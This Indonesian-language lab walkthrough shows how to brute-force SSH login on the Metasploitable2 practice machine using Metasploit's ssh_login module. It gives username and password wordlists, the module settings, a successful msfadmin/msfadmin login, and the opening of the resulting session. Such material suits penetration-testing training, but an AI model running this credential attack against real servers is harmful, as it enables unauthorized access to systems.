# Exploit Port 22 (SSH)
- Buat file dengan nano yang berisi daftar user untuk uji coba
```sh
nano user-metasploitable2.txt
```

- Isi file tersebut dengan daftar user sebagai berikut. Kemudian tekan `Ctrl+o` lalu `enter` untuk menyimpan
```sh
root
admin
msfadmin
administrator
guest
user
test
postgres
oracle
```

- Buat file dengan nano yang berisi daftar password untuk uji coba
```sh
nano password-metasploitable2.txt
```


- Isi file tersebut dengan daftar password sebagai berikut. Kemudian tekan `Ctrl+O` lalu `enter` untuk menyimpan
```sh
qwerty
1234
admin
12345
msfadmin
123123
12345678
```

- Buka msfconsole di terminal
```sh
msfconsole
```

- Cari modul untuk exploit SSH
```sh
search ssh
```

- Gunakan modul `auxiliary/scanner/ssh/ssh_login` untuk brute force SSH login
```sh
use auxiliary/scanner/ssh/ssh_login
```

- Tampilkan daftar parameter yang dibutuhkan di modul tersebut
```sh
show options
```

- Isi parameter yang dibutuhkan di modul tersebut
```sh
set RHOST <IP_metasploitable2>
set VERBOSE true
set USER_FILE /home/kali/user-metasploitable2.txt
set PASS_FILE /home/kali/password-metasploitable2.txt
set STOP_ON_SUCCESS true
```

- Setelah pengisian parameter selesai jalankan proses brute force. Disini kita berhasil login ke SSH dengan username msfadmin password msfadmin yang berada di session 1
```sh
run
```

- Akses session 1
```sh
sessions -i 1
```
